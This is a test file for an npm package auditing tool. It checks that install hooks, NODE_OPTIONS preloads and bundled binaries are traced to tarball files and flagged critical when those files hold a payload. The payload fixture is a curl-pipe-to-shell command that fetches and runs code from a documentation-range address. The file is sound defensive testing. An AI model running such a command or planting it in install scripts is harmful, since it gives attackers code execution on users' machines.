import assert from "node:assert/strict";
import { describe, test } from "node:test";
import { runRules } from "../src/index.js";
import type { AuditInput, PackageFile } from "../src/types.js";

// install-scripts resolves bare module names, extension-less preloads and bundled bins against the tarball only.

const CURL_SH = "curl -s http://198.51.100.1/x | sh"; // RFC 5737 documentation address
const PAYLOAD = `${CURL_SH}\n`;
const BENIGN = "console.log(1)\n";

function file(path: string, content: string): PackageFile {
  return { path, content, size: Buffer.byteLength(content), changed: false };
}
function inputFor(files: Record<string, string>): AuditInput {
  const list = Object.entries(files).map(([p, c]) => file(p, c));
  return {
    meta: {
      name: "probe", version: "1.0.0", author: null, maintainers: [], license: null,
      hasInstallScripts: false, signature: "unknown", provenance: "unknown", integrity: null,
      unpackedSize: 0, fileCount: list.length,
    },
    files: list,
    mode: "full",
  };
}
const sev = (hook: string, files: Record<string, string>) =>
  runRules(inputFor({ ...files, "package/package.json": JSON.stringify({ scripts: { postinstall: hook } }) }))
    .filter((x) => x.ruleId === "install-scripts").map((x) => x.severity);

/** `hook` is critical when `path` holds the payload and low when it holds a benign file. */
function row(label: string, hook: string, path: string, extra: Record<string, string> = {}) {
  test(`${label}: \`${hook}\``, () => {
    assert.deepEqual(sev(hook, { ...extra, [path]: PAYLOAD }), ["critical"]);
    assert.deepEqual(sev(hook, { ...extra, [path]: BENIGN }), ["low"]);
  });
}
const setup = { "package/setup.js": BENIGN };

describe("preloads from bundled modules", () => {
  row("bare specifier, index.js", "node -r evil setup.js", "package/node_modules/evil/index.js", setup);
  row("bare specifier, file", "node -r evil setup.js", "package/node_modules/evil", setup);
  row("bare specifier, .js", "node --require evil setup.js", "package/node_modules/evil.js", setup);
  row("bare specifier, package main", "node --import evil setup.js", "package/node_modules/evil/lib/run.js", {
    ...setup, "package/node_modules/evil/package.json": '{"main":"lib/run"}',
  });
  row("scoped specifier with a subpath", "node --loader @a/b/x setup.js", "package/node_modules/@a/b/x.js", setup);
  row("extension-less relative value", "node --require=./hook setup.js", "package/hook.js", setup);

  test("a bare specifier that is not shipped resolves nothing", () => {
    assert.deepEqual(sev("node -r evil setup.js", { ...setup, "package/lib/evil/index.js": PAYLOAD }), ["low"]);
  });
  test("a bundled dotenv/config with benign content stays clean", () => {
    assert.deepEqual(sev("node -r dotenv/config setup.js", { ...setup, "package/node_modules/dotenv/config.js": BENIGN }), ["low"]);
  });
});

describe("NODE_OPTIONS and VAR=value prefixes", () => {
  row("extension-less relative value", "NODE_OPTIONS=--require=./hook node -v", "package/hook.js");
  row("flag and value as separate words in quotes", "NODE_OPTIONS='-r ./hook.js' node -v", "package/hook.js");
  row("double-quoted flag and value", 'NODE_OPTIONS="--require ./hook" node -v', "package/hook.js");
  row("bare specifier", "NODE_OPTIONS=--require=evil node -v", "package/node_modules/evil/index.js");
  row("bare specifier, quoted separate words", "NODE_OPTIONS='-r evil' node -v", "package/node_modules/evil/index.js");
  row("a wrapper before the command", "NODE_OPTIONS='-r evil' env node -v", "package/node_modules/evil/index.js");

  test("a quoted value that never closes does not swallow the command", () => {
    assert.deepEqual(sev("NODE_OPTIONS='-r ./hook node setup.js", { ...setup, "package/hook.js": BENIGN }), ["low"]);
    assert.deepEqual(sev("NODE_OPTIONS='-r ./hook node setup.js", { "package/setup.js": PAYLOAD }), ["critical"]);
  });
});

describe("commands from bundled bins", () => {
  row("node_modules/.bin", "evil-bin", "package/node_modules/.bin/evil-bin");
  row("bin as a string", "evil", "package/node_modules/evil/cli.js", { "package/node_modules/evil/package.json": '{"bin":"cli.js"}' });
  row("bin as an object", "evil-bin --flag", "package/node_modules/evil/bin/run", {
    "package/node_modules/evil/package.json": '{"bin":{"evil-bin":"./bin/run"}}',
  });
  row("scoped package bin string", "evil", "package/node_modules/@s/evil/cli.js", { "package/node_modules/@s/evil/package.json": '{"bin":"cli.js"}' });
  row("after a wrapper", "env evil-bin", "package/node_modules/.bin/evil-bin");

  test("a command that no bundled package provides resolves nothing", () => {
    assert.deepEqual(sev("evil-bin", { "package/node_modules/evil/package.json": '{"bin":{"other":"cli.js"}}', "package/node_modules/evil/cli.js": PAYLOAD }), ["low"]);
  });
  test("a malformed bundled package.json is ignored", () => {
    assert.deepEqual(sev("evil", { "package/node_modules/evil/package.json": "{not json", "package/node_modules/evil/cli.js": PAYLOAD }), ["low"]);
  });
});
